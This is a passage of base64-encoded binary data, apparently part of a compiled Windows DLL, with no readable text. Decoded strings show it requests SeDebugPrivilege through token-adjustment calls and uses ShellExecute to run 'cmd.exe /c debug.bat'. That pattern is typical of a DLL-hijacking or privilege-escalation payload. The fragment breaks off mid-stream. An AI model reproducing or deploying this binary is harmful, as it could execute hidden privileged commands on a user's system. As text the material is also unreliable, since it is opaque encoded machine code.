ANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAABSADYAMAAwADgADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABhAHIAZwB1AG0AZQBuAHQAcwANAAoAAAAAAAAAUgA2ADAAMAAyAA0ACgAtACAAZgBsAG8AYQB0AGkAbgBnACAAcABvAGkAbgB0ACAAcwB1AHAAcABvAHIAdAAgAG4AbwB0ACAAbABvAGEAZABlAGQADQAKAAAAAAAAAAAAAgAAACBuABAIAAAAyG0AEAkAAABwbQAQCgAAAChtABAQAAAA0GwAEBEAAABwbAAQEgAAAChsABATAAAA0GsAEBgAAABgawAQGQAAABBrABAaAAAAoGoAEBsAAAAwagAQHAAAAOBpABAeAAAAoGkAEB8AAADYaAAQIAAAAHBoABAhAAAAgGYAEHgAAABgZgAQeQAAAERmABB6AAAAKGYAEPwAAAAgZgAQ/wAAAABmABBNAGkAYwByAG8AcwBvAGYAdAAgAFYAaQBzAHUAYQBsACAAQwArACsAIABSAHUAbgB0AGkAbQBlACAATABpAGIAcgBhAHIAeQAAAAAACgAKAAAAAAAuAC4ALgAAADwAcAByAG8AZwByAGEAbQAgAG4AYQBtAGUAIAB1AG4AawBuAG8AdwBuAD4AAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgAGgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAFAAUABAAEAAQABAAEAAUABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/R2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AR2V0VXNlck9iamVjdEluZm9ybWF0aW9uVwAAAEdldExhc3RBY3RpdmVQb3B1cAAAR2V0QWN0aXZlV2luZG93AE1lc3NhZ2VCb3hXAFUAUwBFAFIAMwAyAC4ARABMAEwAAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBCYXNlIENsYXNzIEFycmF5JwAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoACBUeXBlIERlc2NyaXB0b3InAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgb21uaSBjYWxsc2lnJwAAIGRlbGV0ZVtdAAAAIG5ld1tdAABgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwBgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAYHVkdCByZXR1cm5pbmcnAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgZWggdm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IAEAIAAABYggAQdIIAEAAAAAAIkAAQAAAAAP////8AAAAADAAAALcUABAAAAAAJJAAEAAAAAD/////AAAAAAwAAADrKQAQ/v///wAAAADY////AAAAAP7///8AAAAAcxYAEP7///8AAAAAghYAEP7///8AAAAA2P///wAAAAD+////AAAAADUYABD+////AAAAAEEYABD+////AAAAAMD///8AAAAA/v///wAAAAC9HQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAGkrABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAADi4AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAB3MQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAD40ABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAlzgAEAAAAAD+////AAAAANj///8AAAAA/v///5I6ABCWOgAQAAAAAP7///8AAAAAwP///wAAAAD+////AAAAAH88ABAAAAAA/v///wAAAADY////AAAAAP7///+7PwAQzj8AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAZRQAQfIQAAAAAAAAAAAAAloUAABBgAABshAAAAAAAAAAAAADohQAAAGAAAGSFAAAAAAAAAAAAAAaGAAD4YAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQhQAAuIUAAKSFAAAAAAAAiIUAAICFAABshQAAEoYAACiGAAA4hgAASoYAAF6GAAB6hgAAmIYAAKyGAAC8hgAAyIYAANaGAADkhgAA7oYAAAaHAAAahwAAKocAADqHAABShwAAZIcAAHCHAAB+hwAAkIcAAKCHAADIhwAA1ocAAOiHAAAAiAAAFogAADCIAABGiAAAYIgAAG6IAAB8iAAAlogAAKaIAAC8iAAA1ogAAOKIAAD0iAAADIkAACSJAAAwiQAAOokAAEaJAABYiQAAZokAAHaJAACCiQAAmIkAAKSJAACwiQAAwIkAANaJAADoiQAAAAAAAPaFAAAAAAAAwAFHZXRDdXJyZW50UHJvY2VzcwCyBFNsZWVwAFIAQ2xvc2VIYW5kbGUAS0VSTkVMMzIuZGxsAAD3AU9wZW5Qcm9jZXNzVG9rZW4AAJYBTG9va3VwUHJpdmlsZWdlVmFsdWVBAB8AQWRqdXN0VG9rZW5Qcml2aWxlZ2VzAEFEVkFQSTMyLmRsbAAAHgFTaGVsbEV4ZWN1dGVBAFNIRUxMMzIuZGxsAMUBR2V0Q3VycmVudFRocmVhZElkAADKAERlY29kZVBvaW50ZXIAhgFHZXRDb21tYW5kTGluZUEAwARUZXJtaW5hdGVQcm9jZXNzAADTBFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAApQRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAANJc0RlYnVnZ2VyUHJlc2VudADqAEVuY29kZVBvaW50ZXIAxQRUbHNBbGxvYwAAxwRUbHNHZXRWYWx1ZQDIBFRsc1NldFZhbHVlAMYEVGxzRnJlZQDvAkludGVybG9ja2VkSW5jcmVtZW50AAAYAkdldE1vZHVsZUhhbmRsZVcAAHMEU2V0TGFzdEVycm9yAAACAkdldExhc3RFcnJvcgAA6wJJbnRlcmxvY2tlZERlY3JlbWVudAAARQJHZXRQcm9jQWRkcmVzcwAAzwJIZWFwRnJlZQAAGQFFeGl0UHJvY2VzcwBvBFNldEhhbmRsZUNvdW50AABkAkdldFN0ZEhhbmRsZQAA4wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50APMBR2V0RmlsZVR5cGUAYwJHZXRTdGFydHVwSW5mb1cA0QBEZWxldGVDcml0aWNhbFNlY3Rpb24AEwJHZXRNb2R1bGVGaWxlTmFtZUEAAGEBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAEQVXaWRlQ2hhclRvTXVsdGlCeXRlANoBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAzQJIZWFwQ3JlYXRlAADOAkhlYXBEZXN0cm95AKcDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAkwJHZXRUaWNrQ291bnQAAMEBR2V0Q3VycmVudFByb2Nlc3NJZAB5AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAMsCSGVhcEFsbG9jALEDUmFpc2VFeGNlcHRpb24AADkDTGVhdmVDcml0aWNhbFNlY3Rpb24AAO4ARW50ZXJDcml0aWNhbFNlY3Rpb24AAHIBR2V0Q1BJbmZvAGgBR2V0QUNQAAA3AkdldE9FTUNQAAAKA0lzVmFsaWRDb2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